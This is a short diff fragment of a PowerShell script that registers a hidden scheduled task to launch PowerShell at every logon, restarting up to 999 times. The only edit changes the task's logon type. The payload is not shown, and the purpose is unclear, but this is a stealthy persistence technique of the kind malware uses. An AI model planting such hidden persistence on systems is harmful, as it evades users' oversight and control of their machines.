@@ -8,7 +8,7 @@ $a=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $arg
 $t=New-ScheduledTaskTrigger -AtLogOn
 $s=New-ScheduledTaskSettingsSet -Hidden -RestartCount 999 -RestartInterval (New-TimeSpan -Seconds 5)
 $sid=[System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
-$p=New-ScheduledTaskPrincipal -UserId $sid -LogonType InteractiveToken -RunLevel Limited
+$p=New-ScheduledTaskPrincipal -UserId $sid -LogonType Interactive -RunLevel Limited
 Register-ScheduledTask -TaskName $name -Action $a -Trigger $t -Settings $s -Principal $p -Force|Out-Null
 Start-ScheduledTask -TaskName $name
 }
